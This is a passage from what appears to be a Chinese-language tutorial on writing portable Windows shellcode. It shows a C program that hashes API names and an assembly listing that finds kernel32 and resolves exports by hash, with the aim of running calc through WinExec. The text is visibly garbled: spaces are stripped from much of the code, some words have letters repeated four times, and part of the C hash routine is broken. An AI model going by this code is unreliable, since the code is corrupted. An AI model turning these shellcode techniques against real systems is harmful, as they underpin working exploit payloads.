*func=func[i];
}
}
else
{
char*manfunc[]={argv[1]};
printf("HASH\t\t\tFUNCTION\n----\t\t\t--------\n");
printf("0x%X\t\t%s\n",calculate_hash(*manfunc),*manfunc);
}
return0;
}
long
calculate_hash(char*function_name)
{
intaux=0;
unsignedlonghash=0;
while(*function_name)
{
hash=ror(hash,13);
hash+=*function_name;
*function_name++;
}
while(hash>0)
{
aux=aux>8;
}
hash=aux;
returnhash;
}
longrol(longvalue,intn)
{
__asm__("rol%%cl,%%eax"
:"=a"(value)
:"a"(value),"c"(n)
);
returnvalue;
}
longror(longvalue,intn)
{
__asm__("ror%%cl,%%eax"
:"=a"(value)
:"a"(value),"c"(n)
);
returnvalue;
}
voidbanner()
{
printf("----------------------------------------------\n");
printf(" --==[GenerateHashv1.0]==--\n");
printf("writtenbyrick2600andPeterVanEeckhoutte\n");
printf(" http://www.corelan.be:8800\n");
printf("----------------------------------------------\n");
用} dev-c++编译。
如果你没带参数运行这个脚本，它将会列出源代码中硬编码的函数名的哈希值。你可以指定
一个参数（一个函数名）然后它将会产生那个函数的哈希值。
例子：
C:\shellcode\GenerateHash>GenerateHash.exe MessageBoxA
----------------------------------------------
--==[GenerateHashv1.0]==--
writtenbyrick2600andPeterVanEeckhoutte
http://www.corelan.be:8800
----------------------------------------------
HASH FUNCTION
---- --------
0xA8A24DBC MessageBoxA
加载////映射链接库到eeeexxxxppppllllooooiiiitttt进程
用LLLLooooaaaaddddLLLLiiiibbbbrrrraaaarrrryyyyAAAA::::
基本的思想是这样的：
得到kernel32的基地址
找到指向LoadLibraryA的函数指针
调用LoadLibraryA（“dll名”）和返回这个模块的基地址
如果你不得不调用新链接库的函数，那确信将模块的基地址放入栈中，然后将你要调用的函
数哈希值入栈，然后调用find_function代码。
避免用LLLLooooaaaaddddLLLLiiiibbbbrrrraaaarrrryyyyAAAA：
https://www.hbgary.com/community/martinblog/
将所有东西组合在一起第 1111部分：可移植的 WWWWiiiinnnnEEEExxxxeeeecccc“ccccaaaallllcccc”sssshhhheeeellllllllccccooooddddeeee
我们可以用前面介绍的技术来开始打造通用的/可移植的shellcode。我们从一个简单的例
子开始：用通用的方法执行calc。
这技术很简单。WinExec是kernel32的一部分，因此我们需要得到kernel32.dll的基地址，
然后我们要在kernel32里面定位WinExec的地址（用WInExec的哈希值），最后我们会调用
WinExec，用“calc”做参数。
在这个例子中，我们将
用Topstack技术来定位kernel32
查询导入表来得到WinExec和ExitProcess的地址
将WinExec的参数入栈
调用WinExec
将ExitProcess的参数入栈
调用ExitProcess
汇编代码是这样的：（calc.asm)
;Sampleshellcodethatwillexecutecalc
;WrittenbyPeterVanEeckhoutte
;http://www.corelan.be:8800
[Section.text]
[BITS32]
global_start
_start:
jmpstart_main
;===========FUNCTIONS=============
;=======Function:GetKernel32baseaddress============
;Topstacktechnique
;getkernel32andplaceaddressineax
find_kernel32:
pushesi ;Saveesi
xor esi,esi ;Zeroesi
mov eax,[fs:esi+0x4] ;ExtractTEB
mov eax,[eax-0x1c] ;Snagafunctionpointerthat's0x1cbytesintothestack
find_kernel32_base:
find_kernel32_base_loop:
dec eax ;Subtracttoournextpage
xor ax,ax ;Zerothelowerhalf
cmp word[eax],0x5a4d ;Isthisthetopofkernel32?
jne find_kernel32_base_loop ;Nope? Tryagain.
find_kernel32_base_finished:
pop esi ;Restoreesi
ret ;Return.Eaxnowcontainsbaseaddressofkernel32.dll
;=======Function:Findfunctionbaseaddress============
find_function:
pushad ;saveallregisters
movebp, [esp + 0x24] ;putbaseaddressofmodulethatisbeing
;loadedinebp
moveax, [ebp + 0x3c] ;skipoverMSDOSheader
movedx, [ebp + eax + 0x78];gotoexporttableandputrelativeaddress
;inedx
addedx, ebp ;addbaseaddresstoit.
;edx=absoluteaddressofexporttable
movecx, [edx + 0x18] ;setupcounterECX
;(howmanyexporteditemsareinarray?)
movebx, [edx + 0x20] ;putnamestablerelativeoffsetinebx
addebx, ebp ;addbaseaddresstoit.
;ebx=absoluteaddressofnamestable
find_function_loop:
jecxz find_function_finished ;ifecx=0,thenlastsymbolhasbeenchecked.
;(shouldneverhappen)
;unlessfunctioncouldnotbefound
dececx ;ecx=ecx-1
movesi, [ebx + ecx * 4] ;getrelativeoffsetofthenameassociated
;withthecurrentsymbol
;andstoreoffsetinesi
addesi, ebp ;addbaseaddress.
;esi=absoluteaddressofcurrentsymbol
compute_hash:
xoredi, edi ;zerooutedi
xoreax, eax ;zeroouteax
cld ;cleardirectionflag.
;willmakesurethatitincrementsinsteadof
;decrementswhenusinglods*
compute_hash_again:
lodsb ;loadbytesatesi(currentsymbolname)
;intoal,+incrementesi
testal, al ;bitwisetest:
;seeifendofstringhasbeenreached
jz compute_hash_finished ;ifzeroflagisset=endofstringreached
roredi, 0xd ;ifzeroflagisnotset,rotatecurrent
;valueofhash13bitstotheright
addedi, eax ;addcurrentcharacterofsymbolname
;tohashaccumulator
jmpcompute_hash_again ;continueloop
compute_hash_finished:
find_function_compare:
cmp edi, [esp + 0x28] ;see if computed hash matches requested hash (at
esp+0x28)
;edi=currentcomputedhash
;esi=currentfunctionname(string)
jnzfind_function_loop ;nomatch,gotonextsymbol
movebx, [edx + 0x24] ;ifmatch:extractordinalstable
;relativeoffsetandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofordinalsaddresstable
movcx, [ebx + 2 * ecx] ;getcurrentsymbolordinalnumber(2bytes)
movebx, [edx + 0x1c] ;getaddresstablerelativeandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofaddresstable
mov eax, [ebx + 4 * ecx] ;get relative function offsetfrom its ordinaland put in
eax
addeax, ebp ;addbaseaddress.
;eax=absoluteaddressoffunctionaddress
mov [esp + 0x1c], eax ;overwrite stack copy of eax so
popad ;willreturnfunctionaddressineax
find_function_finished:
popad ;retrieveoriginalregisters.
;eaxwillcontainfunctionaddress
ret
;=======Function:looptolookupfunctions(processallhashes)============
find_funcs_for_dll:
lodsd ;loadcurrenthashintoeax(pointedtobyesi)
pusheax ;pushhashtostack
pushedx ;pushbaseaddressofdlltostack
callfind_function
mov[edi],eax ;writefunctionpointerintoaddressatedi
addesp,0x08
addedi,0x04 ;increaseeditostorenextpointer
cmpesi,ecx ;didweprocessallhashesyet?
jne find_funcs_for_dll ;get next hash and lookup function pointer
find_funcs_for_dll_finished: